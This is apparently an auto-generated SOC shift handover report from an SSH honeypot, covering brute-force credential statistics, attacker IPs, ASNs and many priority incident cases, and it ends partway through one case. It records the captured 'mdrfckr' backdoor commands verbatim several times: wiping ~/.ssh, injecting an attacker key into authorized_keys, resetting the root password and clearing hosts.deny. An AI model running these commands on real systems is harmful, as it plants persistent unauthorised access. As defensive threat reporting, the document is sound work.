# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-13 |
| **Generated At** | 2026-04-13T20:53:20Z |
| **Shift Time** | 20:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **153** |
| Confirmed Threats | **151** |
| False Positives Filtered | **2** (1.3%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **8** |
| High Severity Cases | **58** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **95** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **117** |
| Unique Credential Pairs | **59** |
| Unique Usernames | **28** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **37** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 58 |
| `345gs5662d34` | 26 |
| `claude` | 3 |
| `ubuntu` | 3 |
| `ec2-user` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 27 |
| `345gs5662d34` | 26 |
| `12345678` | 3 |
| `qwer12345678` | 2 |
| `Jh123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 27 |
| `345gs5662d34` | `345gs5662d34` | 26 |
| `root` | `qwer12345678` | 2 |
| `root` | `Jh123456` | 2 |
| `ec2-user` | `12345678` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qazwsx123@123` | `103.139.193.223` | 2026-04-13T19:14:09 |
| `root` | `3245gs5662d34` | `103.139.193.223` | 2026-04-13T19:14:14 |
| `root` | `XXzz112233` | `103.139.193.223` | 2026-04-13T19:16:37 |
| `root` | `1qaz@WSX` | `103.139.193.223` | 2026-04-13T19:19:03 |
| `root` | `123456Ab` | `103.139.193.223` | 2026-04-13T19:26:14 |
| `root` | `Admin@000` | `103.139.193.223` | 2026-04-13T19:31:05 |
| `root` | `qwer12345678` | `197.225.146.23` | 2026-04-13T19:31:55 |
| `root` | `3245gs5662d34` | `197.225.146.23` | 2026-04-13T19:31:58 |
| `root` | `LeitboGi0ro` | `81.30.162.19` | 2026-04-13T19:32:01 |
| `root` | `3245gs5662d34` | `81.30.162.19` | 2026-04-13T19:32:06 |
| `root` | `Qazwsx000@123` | `103.139.193.223` | 2026-04-13T19:33:31 |
| `root` | `Jh123456` | `106.225.215.154` | 2026-04-13T19:35:55 |
| `root` | `qwert1234@` | `103.139.193.223` | 2026-04-13T19:35:56 |
| `root` | `3245gs5662d34` | `106.225.215.154` | 2026-04-13T19:35:58 |
| `root` | `a1234567891011121314151617181920` | `201.77.124.248` | 2026-04-13T19:36:32 |
| `root` | `3245gs5662d34` | `201.77.124.248` | 2026-04-13T19:36:40 |
| `root` | `qazwsx111111!@#` | `103.139.193.223` | 2026-04-13T19:38:23 |
| `root` | `P@sssw0rd` | `201.77.124.248` | 2026-04-13T19:38:28 |
| `root` | `qwertyuiop@` | `103.139.193.223` | 2026-04-13T19:43:17 |
| `root` | `Aa123123123` | `103.139.193.223` | 2026-04-13T19:45:42 |
| `root` | `P2ssw0rd` | `103.139.193.223` | 2026-04-13T19:48:05 |
| `root` | `1qwerty` | `118.186.7.9` | 2026-04-13T19:48:41 |
| `root` | `A1b2C3d4` | `103.139.193.223` | 2026-04-13T19:50:32 |
| `root` | `1qwerty` | `201.77.124.248` | 2026-04-13T19:51:18 |
| `root` | `Aa888888` | `118.186.7.9` | 2026-04-13T19:53:34 |
| `root` | `qazwsx1!@` | `27.128.240.75` | 2026-04-13T19:54:31 |
| `root` | `3245gs5662d34` | `27.128.240.75` | 2026-04-13T19:54:35 |
| `root` | `Root18!` | `201.77.124.248` | 2026-04-13T19:54:57 |
| `root` | `Root000!` | `103.139.193.223` | 2026-04-13T19:57:50 |
| `root` | `cxthhhhh.com` | `201.77.124.248` | 2026-04-13T19:58:39 |
| `root` | `qwer12345678` | `201.77.124.248` | 2026-04-13T20:00:27 |
| `root` | `4rfv@123` | `27.128.240.75` | 2026-04-13T20:03:59 |
| `root` | `Aa888888` | `201.77.124.248` | 2026-04-13T20:04:04 |
| `root` | `12301230` | `27.128.240.75` | 2026-04-13T20:05:34 |
| `root` | `123asd123` | `27.128.240.75` | 2026-04-13T20:06:33 |
| `root` | `Jh123456` | `201.77.124.248` | 2026-04-13T20:07:43 |
| `root` | `Root18!` | `118.186.7.9` | 2026-04-13T20:27:39 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **153** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 148 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 148 | 12 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 148 | 12 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 26 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:cVg3OhGH90Z6"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.186.7.9`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:uTABOquoCFJI"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `27.128.240.75`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `201.77.124.248`, `81.30.162.19`, `27.128.240.75`, `103.139.193.223`, `106.225.215.154`, `197.225.146.23`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **15** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS4668` | LG CNS | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS24945` | Telecommunication Company Vinteleport Ltd. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS398324` | Censys, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-77f873faa9c7

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:14 |
| **Last Seen** | 2026-04-13 19:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:14:08` | `cowrie.session.connect` |
| `2026-04-13 19:14:08` | `cowrie.client.version` |
| `2026-04-13 19:14:08` | `cowrie.client.kex` |
| `2026-04-13 19:14:09` | `cowrie.login.success` |
| `2026-04-13 19:14:09` | `cowrie.session.params` |
| `2026-04-13 19:14:09` | `cowrie.command.input` |
| `2026-04-13 19:14:09` | `cowrie.command.failed` |
| `2026-04-13 19:14:10` | `cowrie.log.closed` |
| `2026-04-13 19:14:10` | `cowrie.session.params` |
| `2026-04-13 19:14:10` | `cowrie.command.input` |
| `2026-04-13 19:14:10` | `cowrie.session.file_download` |
| `2026-04-13 19:14:10` | `cowrie.log.closed` |
| `2026-04-13 19:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c58f3791c9f

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:14 |
| **Last Seen** | 2026-04-13 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:14:13` | `cowrie.session.connect` |
| `2026-04-13 19:14:13` | `cowrie.client.version` |
| `2026-04-13 19:14:13` | `cowrie.client.kex` |
| `2026-04-13 19:14:14` | `cowrie.login.success` |
| `2026-04-13 19:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe3ec5bed7c1

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:16 |
| **Last Seen** | 2026-04-13 19:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:16:36` | `cowrie.session.connect` |
| `2026-04-13 19:16:36` | `cowrie.client.version` |
| `2026-04-13 19:16:36` | `cowrie.client.kex` |
| `2026-04-13 19:16:37` | `cowrie.login.success` |
| `2026-04-13 19:16:37` | `cowrie.session.params` |
| `2026-04-13 19:16:37` | `cowrie.command.input` |
| `2026-04-13 19:16:37` | `cowrie.command.failed` |
| `2026-04-13 19:16:38` | `cowrie.log.closed` |
| `2026-04-13 19:16:38` | `cowrie.session.params` |
| `2026-04-13 19:16:38` | `cowrie.command.input` |
| `2026-04-13 19:16:38` | `cowrie.session.file_download` |
| `2026-04-13 19:16:38` | `cowrie.log.closed` |
| `2026-04-13 19:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9668b112b418

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:16 |
| **Last Seen** | 2026-04-13 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:16:41` | `cowrie.session.connect` |
| `2026-04-13 19:16:41` | `cowrie.client.version` |
| `2026-04-13 19:16:41` | `cowrie.client.kex` |
| `2026-04-13 19:16:42` | `cowrie.login.success` |
| `2026-04-13 19:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5f3877ea99

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:19 |
| **Last Seen** | 2026-04-13 19:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:19:02` | `cowrie.session.connect` |
| `2026-04-13 19:19:02` | `cowrie.client.version` |
| `2026-04-13 19:19:02` | `cowrie.client.kex` |
| `2026-04-13 19:19:03` | `cowrie.login.success` |
| `2026-04-13 19:19:04` | `cowrie.session.params` |
| `2026-04-13 19:19:04` | `cowrie.command.input` |
| `2026-04-13 19:19:04` | `cowrie.command.failed` |
| `2026-04-13 19:19:04` | `cowrie.log.closed` |
| `2026-04-13 19:19:04` | `cowrie.session.params` |
| `2026-04-13 19:19:04` | `cowrie.command.input` |
| `2026-04-13 19:19:04` | `cowrie.session.file_download` |
| `2026-04-13 19:19:04` | `cowrie.log.closed` |
| `2026-04-13 19:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e09715082b

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:19 |
| **Last Seen** | 2026-04-13 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:19:07` | `cowrie.session.connect` |
| `2026-04-13 19:19:07` | `cowrie.client.version` |
| `2026-04-13 19:19:07` | `cowrie.client.kex` |
| `2026-04-13 19:19:08` | `cowrie.login.success` |
| `2026-04-13 19:19:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ceba886e0fb

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:26 |
| **Last Seen** | 2026-04-13 19:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:26:13` | `cowrie.session.connect` |
| `2026-04-13 19:26:13` | `cowrie.client.version` |
| `2026-04-13 19:26:13` | `cowrie.client.kex` |
| `2026-04-13 19:26:14` | `cowrie.login.success` |
| `2026-04-13 19:26:14` | `cowrie.session.params` |
| `2026-04-13 19:26:14` | `cowrie.command.input` |
| `2026-04-13 19:26:14` | `cowrie.command.failed` |
| `2026-04-13 19:26:15` | `cowrie.log.closed` |
| `2026-04-13 19:26:15` | `cowrie.session.params` |
| `2026-04-13 19:26:15` | `cowrie.command.input` |
| `2026-04-13 19:26:15` | `cowrie.session.file_download` |
| `2026-04-13 19:26:15` | `cowrie.log.closed` |
| `2026-04-13 19:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da3c91c39616

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:26 |
| **Last Seen** | 2026-04-13 19:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:26:18` | `cowrie.session.connect` |
| `2026-04-13 19:26:18` | `cowrie.client.version` |
| `2026-04-13 19:26:18` | `cowrie.client.kex` |
| `2026-04-13 19:26:19` | `cowrie.login.success` |
| `2026-04-13 19:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2116c9bc48db

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:31 |
| **Last Seen** | 2026-04-13 19:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:31:04` | `cowrie.session.connect` |
| `2026-04-13 19:31:04` | `cowrie.client.version` |
| `2026-04-13 19:31:05` | `cowrie.client.kex` |
| `2026-04-13 19:31:05` | `cowrie.login.success` |
| `2026-04-13 19:31:06` | `cowrie.session.params` |
| `2026-04-13 19:31:06` | `cowrie.command.input` |
| `2026-04-13 19:31:06` | `cowrie.command.failed` |
| `2026-04-13 19:31:06` | `cowrie.log.closed` |
| `2026-04-13 19:31:06` | `cowrie.session.params` |
| `2026-04-13 19:31:06` | `cowrie.command.input` |
| `2026-04-13 19:31:07` | `cowrie.session.file_download` |
| `2026-04-13 19:31:07` | `cowrie.log.closed` |
| `2026-04-13 19:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d9f51b4059

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:31 |
| **Last Seen** | 2026-04-13 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:31:09` | `cowrie.session.connect` |
| `2026-04-13 19:31:09` | `cowrie.client.version` |
| `2026-04-13 19:31:09` | `cowrie.client.kex` |
| `2026-04-13 19:31:10` | `cowrie.login.success` |
| `2026-04-13 19:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f20e34e69905

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-13 19:31 |
| **Last Seen** | 2026-04-13 19:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
